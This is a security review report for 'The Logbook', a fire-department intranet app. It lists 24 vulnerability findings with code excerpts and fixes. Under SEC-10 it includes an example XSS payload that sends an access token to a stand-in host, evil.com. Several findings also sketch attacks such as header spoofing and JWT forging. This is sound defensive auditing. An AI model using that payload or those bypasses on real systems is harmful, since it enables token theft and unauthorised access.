# Security Review: The Logbook

**Date:** 2026-02-07
**Reviewer:** Red Team Security Review
**Scope:** Full application stack (FastAPI backend, React frontend, Docker infrastructure)
**Classification:** CONFIDENTIAL

---

## Executive Summary

The Logbook is a well-architected intranet platform for fire departments with many strong security foundations: Argon2id password hashing, AES-256 encryption, tamper-proof audit logging, and role-based access control. However, the review identified **8 critical**, **7 high**, and **9 medium** severity vulnerabilities that should be addressed before production deployment, especially given the HIPAA compliance requirements.

---

## Findings Summary

| ID | Severity | Category | Title |
|----|----------|----------|-------|
| SEC-01 | CRITICAL | Auth | JWT signed with HS256 using a shared secret key |
| SEC-02 | CRITICAL | Config | Insecure default secrets ship in source code |
| SEC-03 | CRITICAL | Auth | No server-side session validation on token use |
| SEC-04 | CRITICAL | CSRF | CSRF protection is not implemented (stub only) |
| SEC-05 | CRITICAL | Auth | Open user registration without approval workflow |
| SEC-06 | CRITICAL | Rate Limit | Rate limiting fails open when Redis is unavailable |
| SEC-07 | CRITICAL | Injection | Raw SQL string in periodic security check |
| SEC-08 | CRITICAL | Auth | Onboarding endpoints have no authentication |
| SEC-09 | HIGH | Crypto | Single static Fernet cipher initialized at module load |
| SEC-10 | HIGH | Token | JWT tokens stored in localStorage (XSS exfiltration) |
| SEC-11 | HIGH | Auth | Refresh token not rotated on use |
| SEC-12 | HIGH | Election | Voter anonymity can be defeated via voter_hash |
| SEC-13 | HIGH | InfoLeak | User enumeration via registration error messages |
| SEC-14 | HIGH | Config | Database port exposed to host in docker-compose |
| SEC-15 | HIGH | Config | Elasticsearch runs with security disabled |
| SEC-16 | MEDIUM | Header | X-Forwarded-For header trusted without validation |
| SEC-17 | MEDIUM | Auth | Account lockout is a denial-of-service vector |
| SEC-18 | MEDIUM | Input | Broken sanitize_input function (logic error) |
| SEC-19 | MEDIUM | Token | Access token lifetime of 8 hours is excessive |
| SEC-20 | MEDIUM | Logging | Sensitive data in log messages |
| SEC-21 | MEDIUM | CORS | CORS allows credentials with configurable origins |
| SEC-22 | MEDIUM | Deps | No dependency pinning or vulnerability scanning |
| SEC-23 | MEDIUM | Perms | Permission checker uses OR logic (any-of) |
| SEC-24 | MEDIUM | Docker | Backend runs as root in container |

---

## Detailed Findings

### SEC-01: JWT Signed with HS256 Using Shared Secret (CRITICAL)

**File:** `backend/app/core/security.py:312`, `backend/app/core/config.py:86`

**Description:** JWTs are signed using HS256 (symmetric HMAC) with a single `SECRET_KEY`. This means the same key is used to both sign and verify tokens. If this key is leaked (via logs, error messages, code repository, backup, or any server compromise), an attacker can forge arbitrary JWT tokens for any user, including administrators.

**Attack Vector:** An attacker who obtains the `SECRET_KEY` can craft JWT tokens with arbitrary `sub` (user ID), `org_id`, and `username` claims, granting full access to any account.

**Remediation:**
- Switch to RS256 (asymmetric) JWT signing where the private key signs tokens and the public key verifies them. This limits the blast radius of key exposure.
- If HS256 must be used, ensure the key is at least 256 bits of cryptographic randomness and is stored in a dedicated secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault), not environment variables.
- Add a `jti` (JWT ID) claim to enable token revocation.

---

### SEC-02: Insecure Default Secrets Ship in Source Code (CRITICAL)

**File:** `backend/app/core/config.py:85,98,41`

**Description:** The configuration contains hardcoded insecure defaults:
```python
SECRET_KEY: str = "INSECURE_DEFAULT_KEY_CHANGE_IN_PRODUCTION"
ENCRYPTION_KEY: str = "INSECURE_DEFAULT_KEY_CHANGE_ME"
DB_PASSWORD: str = "change_me_in_production"
```

While there is a `validate_security_config()` method, it only runs when `ENVIRONMENT == "production"`. In development or staging, these defaults are silently accepted. Additionally, `SECURITY_BLOCK_INSECURE_DEFAULTS` defaults to `True` but can be trivially disabled.

**Attack Vector:** If the application is deployed without changing these defaults (common in rushed deployments), all encryption, JWT signing, and database access use known values. Any attacker who reads the source code can decrypt all data and forge tokens.

**Remediation:**
- Remove all default values for security-critical settings. Make them required fields that fail at startup if not provided, regardless of environment.
- Use `SecretStr` from Pydantic for secrets to prevent accidental logging.
- Add a startup check that blocks startup in ALL environments if secrets match known-insecure patterns (not just production).
- Generate unique secrets during installation as part of a mandatory setup script.

---

### SEC-03: No Server-Side Session Validation on Token Use (CRITICAL)

**File:** `backend/app/services/auth_service.py:342-372`, `backend/app/api/dependencies.py:69-103`

**Description:** When `get_user_from_token()` validates a JWT, it only decodes the token and queries the user from the database. It does **not** check whether the session associated with the token is still valid or has been revoked. The `Session` table exists and tokens are stored there at creation, but subsequent requests never verify against it.

This means:
- Logging out deletes the session row, but the JWT remains valid until expiration.
- An admin deactivating a user doesn't invalidate existing tokens.
- Stolen tokens work until they expire (8 hours).

**Attack Vector:** A stolen access token continues to work for up to 8 hours even after the user logs out or is deactivated. An attacker who captures a token (via XSS, network sniffing, or device access) has an extended exploitation window.

**Remediation:**
- On every authenticated request, verify the token against the `sessions` table. If the session is deleted or expired, reject the token.
- Implement a token blocklist (in Redis for performance) that is checked on every request.
- When a user is deactivated or their password is changed, invalidate all their sessions immediately.

---

### SEC-04: CSRF Protection Is Not Implemented (CRITICAL)

**File:** `backend/app/core/security_middleware.py:338-365`

**Description:** The `verify_csrf_token` dependency exists as a stub but is never used. The function attempts to read from `request.session` which does not exist (no session middleware is configured). Even if it did, the logic returns early with no error when no session token is found:

```python
if not session_token:
    # Generate new token if none exists
    return  # <-- Silently passes validation
```

No endpoint in the entire application uses CSRF protection. The CORS middleware accepts `allow_credentials=True`, which means cookies are sent cross-origin.

**Attack Vector:** A malicious website can craft requests to the API on behalf of an authenticated user. While the API primarily uses Bearer tokens (not cookies), the `allow_credentials=True` CORS setting combined with the token refresh interceptor creates a scenario where a CSRF attack could be viable, especially if cookie-based auth is ever added.

**Remediation:**
- For the current Bearer-token architecture, ensure tokens are NEVER stored in cookies. The current localStorage approach is actually more resistant to CSRF (but vulnerable to XSS; see SEC-10).
- If cookie-based authentication is ever added, implement proper CSRF protection with the double-submit cookie pattern or synchronizer token pattern.
- Remove the non-functional CSRF stub to avoid a false sense of security.
- Set `allow_credentials=False` in CORS unless cookie-based auth is required.

---

### SEC-05: Open User Registration Without Approval Workflow (CRITICAL)

**File:** `backend/app/api/v1/endpoints/auth.py:32-96`

**Description:** The `/api/v1/auth/register` endpoint allows anyone to create an account in the organization. The endpoint looks up the first organization in the database and registers the user in it. There is no:
- Invitation code or token requirement
- Admin approval workflow
- Domain-restricted email validation
- Organization membership verification

For a fire department intranet containing HIPAA-protected data, this is a significant risk.

**Attack Vector:** An external attacker can register an account and gain access to the organization's data. While they won't have admin permissions, the default authenticated access allows viewing member lists, events, and potentially training records.

**Remediation:**
- Require an invitation token or admin pre-approval for registration.
- Implement email domain restrictions (e.g., only `@firedepartment.gov` emails).
- Add an admin approval queue where new registrations must be approved before the account is activated.
- Consider removing public registration entirely and requiring admins to create accounts (the admin user creation flow already exists at `POST /users/`).

---

### SEC-06: Rate Limiting Fails Open When Redis Is Unavailable (CRITICAL)

**File:** `backend/app/core/security.py:487-528`

**Description:** The async rate limiting function `is_rate_limited()` returns `False` (not limited) when Redis is unavailable:

```python
if not cache_manager.is_connected or not cache_manager.redis_client:
    return False  # Allow the request
```

The in-memory `RateLimiter` class in `security_middleware.py` is also process-local and doesn't scale across multiple instances. In production with multiple backend instances behind a load balancer, an attacker can target any instance.

**Attack Vector:** An attacker can trigger Redis connection failures (via resource exhaustion or network disruption) to bypass all rate limiting, then perform brute-force credential stuffing attacks without restriction.

**Remediation:**
- Rate limiting should fail closed (deny requests) when the backing store is unavailable, at least for authentication endpoints.
- Implement a fallback in-memory rate limiter with a conservative limit that activates when Redis is down.
- Add monitoring/alerting for Redis connectivity failures.
- Consider using a WAF or API gateway for rate limiting as defense-in-depth.

---

### SEC-07: Raw SQL String in Periodic Security Check (CRITICAL)

**File:** `backend/app/core/security_middleware.py:868-869`

**Description:** The `run_periodic_security_checks` function executes a raw SQL string:

```python
log_status = await db.execute(
    "SELECT MIN(id), MAX(id), COUNT(*) FROM audit_logs WHERE created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)"
)
```

While this particular query has no user input and is therefore not exploitable via injection, using raw SQL strings bypasses SQLAlchemy's query builder and sets a dangerous precedent. It also breaks portability and makes the code harder to audit.

**Remediation:**
- Rewrite using SQLAlchemy's query builder:
  ```python
  from sqlalchemy import select, func, text
  stmt = select(
      func.min(AuditLog.id),
      func.max(AuditLog.id),
      func.count()
  ).where(AuditLog.created_at > func.date_sub(func.now(), text("INTERVAL 1 HOUR")))
  ```
- Establish a coding standard that prohibits raw SQL strings and enforce it via linting.

---

### SEC-08: Onboarding Endpoints Have No Authentication (CRITICAL)

**File:** `backend/app/api/v1/onboarding.py`, `backend/app/core/security_middleware.py:514`

**Description:** All onboarding endpoints are completely unauthenticated and bypass IP blocking:

```python
BYPASS_PREFIXES = ("/api/v1/onboarding",)
```

The onboarding flow creates the organization, the admin user account, configures modules, and sets up email/auth. While a session mechanism is used (X-Session-ID header), it is self-generated and not tied to any authenticated identity. After onboarding completes, these endpoints should be locked down, but there is no evidence of that enforcement beyond a `needs_onboarding` check.

**Attack Vector:**
1. If the onboarding status check can be bypassed or reset, an attacker could re-onboard the system, creating a new admin account.
2. An attacker could race the legitimate admin during initial setup to complete onboarding first.
3. The session token for onboarding is passed via header and has no IP binding.

**Remediation:**
- After onboarding is complete, hard-disable all onboarding endpoints (return 403) rather than relying on a database flag.
- Add a startup check that permanently disables the onboarding route registration if onboarding is already complete.
- Consider adding a secret setup token that must be provided to access onboarding endpoints.

---

### SEC-09: Single Static Fernet Cipher Initialized at Module Load (HIGH)

**File:** `backend/app/core/security.py:241`

**Description:** The Fernet cipher is initialized once at module import time:

```python
cipher = Fernet(get_encryption_key())
```

This means:
1. If the `ENCRYPTION_KEY` or `ENCRYPTION_SALT` environment variable is changed, the application must be restarted.
2. All encrypted data uses the same key with no key rotation support.
3. The derived key is held in process memory for the entire application lifetime.

**Remediation:**
- Implement key versioning where encrypted data includes a key version identifier.
- Support key rotation by maintaining a list of decryption keys while using only the latest for encryption.
- Consider using envelope encryption where a master key encrypts data-specific keys.

---

### SEC-10: JWT Tokens Stored in localStorage (HIGH)

**File:** `frontend/src/stores/authStore.ts:40-41`, `frontend/src/services/api.ts:101`

**Description:** Both access and refresh tokens are stored in `localStorage`:

```typescript
localStorage.setItem('access_token', response.access_token);
localStorage.setItem('refresh_token', response.refresh_token);
```

`localStorage` is accessible to any JavaScript running on the same origin. If an XSS vulnerability exists anywhere in the application (including third-party dependencies), an attacker can steal both tokens.

**Attack Vector:** An XSS payload like `fetch('https://evil.com/?t='+localStorage.getItem('access_token'))` would exfiltrate both tokens, giving the attacker full authenticated access for the token's lifetime.

**Remediation:**
- Store tokens in `httpOnly` cookies with `Secure`, `SameSite=Strict`, and `Path` attributes. HttpOnly cookies are not accessible via JavaScript.
- Alternatively, keep the access token in memory only (a JavaScript variable) and use a secure, httpOnly refresh token cookie to obtain new access tokens. This limits the window of XSS exploitation.
- Implement a strict Content Security Policy (the current CSP is good but would need `connect-src` to be tightened).

---

### SEC-11: Refresh Token Not Rotated on Use (HIGH)

**File:** `backend/app/services/auth_service.py:146-202`

**Description:** When a refresh token is used to obtain a new access token, the refresh token itself is not rotated. The same refresh token can be used repeatedly for the entire 7-day validity period.

**Attack Vector:** If a refresh token is stolen, the attacker can use it to generate new access tokens for 7 days. Even if the user logs out (which only invalidates the access token's session), the refresh token remains valid.

**Remediation:**
- Implement refresh token rotation: each time a refresh token is used, issue a new refresh token and invalidate the old one.
- Implement refresh token families: if a previously-used refresh token is reused (indicating theft), invalidate all tokens in the family.
- On logout, explicitly invalidate the refresh token as well.

---

### SEC-12: Voter Anonymity Can Be Defeated via voter_hash (HIGH)

**File:** `backend/app/services/election_service.py:292-297`

**Description:** The anonymous voting hash is generated deterministically:

```python
def _generate_voter_hash(self, user_id: UUID, election_id: UUID) -> str:
    data = f"{user_id}:{election_id}"
    return hashlib.sha256(data.encode()).hexdigest()
```

A database administrator (or anyone who gains database access) who knows the user IDs and election ID can pre-compute the hashes for all users and then look up which hash corresponds to which voter, defeating the anonymity guarantee.

**Attack Vector:** An insider with database access generates voter_hash values for all members, then joins them with the `votes` table to de-anonymize every vote.

**Remediation:**
- Add a per-election random salt that is stored separately (or destroyed after the election closes) so voter hashes cannot be pre-computed.
- Better yet, use a cryptographic commitment scheme or zero-knowledge proof approach for anonymous voting.
- Consider making the voter_hash a keyed HMAC with a secret that can be destroyed post-election.

---

### SEC-13: User Enumeration via Registration Error Messages (HIGH)

**File:** `backend/app/services/auth_service.py:243,254`

**Description:** Registration error messages reveal whether a username or email is already registered:

```python
return None, f"Username '{username}' is already taken. Try a different username..."
return None, f"Email '{email}' is already registered. Use a different email address..."
```

**Attack Vector:** An attacker can enumerate valid usernames and email addresses by attempting to register with different values and observing the error messages.

**Remediation:**
- Return a generic error message like "Registration could not be completed. Please try different credentials or contact your administrator."
- If helpful error messages are desired, rate-limit the registration endpoint more aggressively (it's currently 5/min but that still allows significant enumeration).

---

### SEC-14: Database Port Exposed to Host in docker-compose (HIGH)

**File:** `docker-compose.yml:23`

**Description:** The MySQL port is exposed to the Docker host:

```yaml
ports:
  - "${DB_PORT:-3306}:3306"
```

This makes the database accessible from outside the Docker network. The Redis port is also exposed (line 49).

**Remediation:**
- Remove port mappings for MySQL and Redis in production. Services within the Docker network can communicate without port exposure.
- If host access is needed for development tools, use the `profiles` feature to only expose ports in development.

---

### SEC-15: Elasticsearch Runs with Security Disabled (HIGH)

**File:** `docker-compose.yml:148`

**Description:**
```yaml
xpack.security.enabled=false
```

Elasticsearch has its security features explicitly disabled, meaning no authentication, no TLS, and no role-based access control.

**Remediation:**
- Enable xpack.security in production.
- Configure TLS between Elasticsearch and the backend.
- Set up Elasticsearch credentials and pass them to the backend via environment variables.

---

### SEC-16: X-Forwarded-For Header Trusted Without Validation (MEDIUM)

**File:** `backend/app/core/security_middleware.py:478-487`

**Description:** The `get_client_ip` function trusts the `X-Forwarded-For` header without validation:

```python
forwarded_for = request.headers.get("X-Forwarded-For")
if forwarded_for:
    return forwarded_for.split(",")[0].strip()
```

This header can be spoofed by clients. An attacker can set `X-Forwarded-For: 127.0.0.1` to bypass IP-based rate limiting and geo-blocking.

**Remediation:**
- Only trust `X-Forwarded-For` when the request comes from a known reverse proxy IP.
- Use a configurable list of trusted proxy IPs.
- Consider using Uvicorn's `--proxy-headers` flag with `--forwarded-allow-ips` to validate proxy headers at the ASGI level.

---

### SEC-17: Account Lockout is a Denial-of-Service Vector (MEDIUM)

**File:** `backend/app/services/auth_service.py:79-84`

**Description:** After 5 failed login attempts, an account is locked for 30 minutes. There is no CAPTCHA or other human-verification mechanism.

**Attack Vector:** An attacker can lock out any user account by sending 5 requests with incorrect passwords to the login endpoint with the victim's username. This is a denial-of-service against individual users.

**Remediation:**
- Implement CAPTCHA (e.g., hCaptcha, reCAPTCHA) after 3 failed attempts instead of locking the account.
- Use progressive delays (increasing wait times) instead of hard lockouts.
- Notify the user via email when their account is locked.
- Allow unlock via email or admin action.

---

### SEC-18: Broken sanitize_input Function (MEDIUM)

**File:** `backend/app/core/security.py:440`

**Description:** The sanitize_input function contains a logic error:

```python
text = ''.join(char for char in text if char in allowed_control or not char.isprintable() is False)
```

The expression `not char.isprintable() is False` is always `True` due to Python operator precedence (`not` binds tighter than `is`). This means the function keeps ALL characters, defeating its purpose of removing control characters.

The correct expression should be:
```python
text = ''.join(char for char in text if char in allowed_control or char.isprintable())
```

**Remediation:**
- Fix the logic error as shown above.
- Add unit tests for the sanitization function with control characters as input.
- Note: this function is not widely used in the codebase (Pydantic handles most validation), but it should still be correct.

---

### SEC-19: Access Token Lifetime of 8 Hours Is Excessive (MEDIUM)

**File:** `backend/app/core/config.py:87`

**Description:** Access tokens are valid for 480 minutes (8 hours). Combined with the lack of server-side session validation (SEC-03), a stolen token grants access for the entire workday.

**Remediation:**
- Reduce access token lifetime to 15-30 minutes.
- Rely on the refresh token mechanism to transparently obtain new access tokens.
- This makes token theft significantly less impactful while maintaining user experience through silent refresh.

---

### SEC-20: Sensitive Data in Log Messages (MEDIUM)

**Files:** Various service files

**Description:** Several log messages include potentially sensitive information:
- `auth_service.py:142` logs usernames on session creation
- `security_middleware.py:404` prints full security audit entries to stdout
- `auth_service.py:73` logs usernames on failed authentication (with account locked warnings)

While logging usernames for audit purposes is common, the pattern of logging to stdout with `print()` (line 404) bypasses the structured logging system.

**Remediation:**
- Replace `print()` statements with structured `loguru` logging.
- Ensure logs never contain passwords, tokens, or PII.
- Implement log scrubbing for sensitive fields.
- Use the `mask_sensitive_data()` function consistently.

---

### SEC-21: CORS Allows Credentials with Configurable Origins (MEDIUM)

**File:** `backend/main.py:435-450`

**Description:** CORS is configured with `allow_credentials=True` and origins loaded from environment variables. If an attacker can influence the `ALLOWED_ORIGINS` environment variable or if a wildcard is mistakenly added, credentialed cross-origin requests would be accepted.

**Remediation:**
- Validate that `ALLOWED_ORIGINS` does not contain wildcards (`*`) when `allow_credentials=True`.
- Add startup validation that rejects `*` in origins when credentials are enabled.
- Consider whether `allow_credentials=True` is actually needed (it's only required for cookie-based auth).

---

### SEC-22: No Dependency Pinning or Vulnerability Scanning (MEDIUM)

**File:** `backend/requirements.txt`

**Description:** Dependencies are pinned with `==` versions, which is good. However, there is no evidence of automated vulnerability scanning (e.g., `pip-audit`, `safety`, Dependabot, or Snyk) in the CI/CD pipeline.

**Remediation:**
- Add `pip-audit` or `safety` to the CI/CD pipeline to scan for known vulnerabilities.
- Enable Dependabot or Renovate for automated dependency updates.
- Run `npm audit` for frontend dependencies.
- Consider using a lock file (`pip-compile` with `pip-tools`) for reproducible builds.

---

### SEC-23: Permission Checker Uses OR Logic (MEDIUM)

**File:** `backend/app/api/dependencies.py:44-48`

**Description:** The `PermissionChecker` grants access if the user has **any** of the required permissions:

```python
for perm in self.required_permissions:
    if perm in user_permissions:
        return current_user  # Returns on first match
```

This is OR logic. Some endpoints like `require_permission("users.update_roles", "members.assign_roles")` may intend to require ALL permissions, but the implementation only requires one.

**Remediation:**
- Document clearly that `require_permission()` uses OR logic (any-of).
- If AND logic is needed, create a separate `require_all_permissions()` dependency.
- Review all permission checks to ensure OR logic is the correct intent.

---

### SEC-24: Backend Runs as Root in Container (MEDIUM)

**File:** `backend/Dockerfile` (inferred from `docker-compose.yml`)

**Description:** The Docker Compose configuration doesn't specify a non-root user for the backend container, and the Uvicorn command runs directly without user specification.

**Remediation:**
- Add a non-root user in the Dockerfile:
  ```dockerfile
  RUN adduser --disabled-password --gecos '' appuser
  USER appuser
  ```
- Ensure file permissions allow the non-root user to access required directories.

---

## Positive Security Observations

The following security practices are well-implemented and should be maintained:

1. **Password Hashing:** Argon2id with OWASP-recommended parameters (time_cost=3, memory_cost=64MB, parallelism=4).
2. **Tamper-Proof Audit Logs:** Hash-chain integrity with SHA-256, append-only design, 7-year retention.
3. **Password Policy:** Strong requirements (12+ chars, uppercase, lowercase, numbers, special, no sequential/repeated characters, no common passwords).
4. **Organization Scoping:** All database queries filter by `organization_id`, preventing cross-tenant data access.
5. **Pydantic Validation:** Input validation via Pydantic schemas prevents most injection attacks at the API boundary.
6. **Security Headers:** Comprehensive security headers including HSTS, CSP, X-Frame-Options, and Permissions-Policy.
7. **Password Reset:** Uses SHA-256 hashed tokens with 30-minute expiry, preventing email enumeration.
8. **GeoIP Blocking:** Country-based access control for high-risk nations.
9. **Soft Deletes:** Users are soft-deleted (`deleted_at`), maintaining audit trail integrity.
10. **SQLAlchemy ORM:** Consistent use of parameterized queries via SQLAlchemy prevents SQL injection.

---

## Remediation Priority

### Immediate (Before any production deployment)
1. SEC-02: Remove insecure default secrets
2. SEC-05: Lock down user registration
3. SEC-08: Secure onboarding endpoints post-setup
4. SEC-06: Fix rate limiting fail-open behavior

### Short-term (Within first sprint)
5. SEC-03: Implement server-side session validation
6. SEC-04: Remove CSRF stub or implement properly
7. SEC-01: Consider switching to RS256 JWT signing
8. SEC-10: Move tokens out of localStorage
9. SEC-11: Implement refresh token rotation

### Medium-term (Within first month)
10. SEC-13: Fix user enumeration in registration
11. SEC-16: Validate X-Forwarded-For against trusted proxies
12. SEC-19: Reduce access token lifetime
13. SEC-14: Stop exposing database ports
14. SEC-18: Fix sanitize_input logic error
15. SEC-12: Improve anonymous voting scheme

### Ongoing
16. SEC-22: Set up dependency vulnerability scanning
17. SEC-20: Audit and clean up logging
18. SEC-17: Implement CAPTCHA for brute-force mitigation
